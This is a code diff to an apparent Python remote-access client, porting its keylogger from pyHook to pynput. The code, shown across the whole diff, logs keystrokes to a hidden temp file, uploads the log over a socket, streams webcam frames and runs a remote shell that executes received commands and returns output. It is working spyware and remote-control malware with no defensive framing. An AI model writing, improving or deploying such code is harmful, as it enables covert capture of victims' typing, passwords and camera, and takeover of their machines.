@@ -1,11 +1,11 @@
 import socket 
 import threading
-import socket, cv2
+import socket
+import cv2
 import numpy
 import struct
 import pickle
-import pythoncom
-import pyHook
+from pynput import keyboard
 import tempfile
 import subprocess
 import os
@@ -20,7 +20,7 @@ SERVER = socket.gethostbyname(socket.gethostname())
 ADDR = (SERVER, PORT)
 
 FILE_NAME = tempfile.mkdtemp()+"\key_log.txt"
-obj = pyHook.HookManager()
+isCapsOn = False
 
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 client.connect(ADDR)
@@ -35,42 +35,28 @@ def recWebCam(SERVER):
 
         # client.close()
 
-def keypressed(event):
-    global data
+def on_press(key):
+    fp = open(FILE_NAME, 'a+')
+    try:
+        if isCapsOn:
+            fp.write(key.char.upper())
+        else:
+            fp.write(key.char)
+        fp.close()
+    except AttributeError:
+        if key == keyboard.Key.tab:
+            fp.write('\t')
+        if key == keyboard.Key.backspace:
+            fp.write('[bsp]')
+        if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
+            fp.write('[ctrl]')
+        if key == keyboard.Key.enter:
+            fp.write('\n')
+        if key == keyboard.Key.caps_lock:
+            isCapsOn != isCapsOn
+        fp.close()
 
-    if event.Ascii == 13:
-            keys = '\n'
-            fp = open(FILE_NAME,'a+')
-            data = keys            
-            fp.write(data)
-            fp.close()
-    elif event.Ascii == 8:
-            keys = ' <BS> '
-            fp = open(FILE_NAME,'a+')
-            data = keys            
-            fp.write(data)
-            fp.close()
-    elif event.Ascii == 9:
-            keys = ' \t '
-            fp = open(FILE_NAME,'a+')
-            data = keys
-            fp.write(data)
-            fp.close()
-    elif event.Ascii == 27:
-            keys = ' <ESC> '
-            fp = open(FILE_NAME,'a+')
-            data = keys
-            fp.write(data + "\n")
-            fp.close()
-    elif event.Ascii == 1 or event.Ascii == 3 or event.Ascii == 19 or event.Ascii == 0 or event.Ascii == 24:
-            pass
-    else:
-            keys = chr(event.Ascii)
-            fp = open(FILE_NAME,'a+')
-            data = keys
-            fp.write(data)
-            fp.close()
-    return 0
+listener = keyboard.Listener(on_press=on_press)   
 
 def transfer(s):
     f = open(FILE_NAME, 'rb')
@@ -82,12 +68,10 @@ def transfer(s):
     client.send(b'DONE')
 
 def startKeyLogger():
-    obj.KeyDown = keypressed
-    obj.HookKeyboard()
-    pythoncom.PumpMessages()
+    listener.start()
     
 def stopKeyLogger():
-    obj.UnhookKeyboard()
+    listener.stop()
     transfer(SERVER)
 
 def get_shell(s):
@@ -106,9 +90,7 @@ def get_shell(s):
             path = items[items.index('cd') + 1]
             os.chdir(path)
             
-        
         client.send(output.encode())
-        # client.send(cmd.stderr.read())
 
 def client_func():
     while True:
@@ -126,7 +108,6 @@ def client_func():
             get_shell(SERVER)
         elif 'terminate' in command:
             client.close()
-            obj.UnhookKeyboard()
             break
 
 client_func()
